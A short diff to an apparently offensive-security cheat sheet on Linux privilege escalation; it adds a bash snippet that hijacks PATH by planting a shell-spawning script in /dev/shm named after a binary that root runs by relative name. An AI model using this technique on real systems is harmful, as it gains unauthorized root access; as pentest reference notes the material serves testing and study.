@@ -83,6 +83,14 @@ Shell escape sequences:
 
 [https://atom.hackstreetboys.ph/linux-privilege-escalation-shell-escape-sequences/](https://atom.hackstreetboys.ph/linux-privilege-escalation-shell-escape-sequences/)
 
+Abuse non-absolute path in binaries/scripts run as root:
+
+```bash
+echo "#!/bin/bash\nbash" > /dev/shm/$SUID_BIN
+chmod +x /dev/shm/$SUID_BIN
+export PATH=/dev/shm:$PATH
+```
+
 Proper path for GCC and other utilities:
 
 ```shell
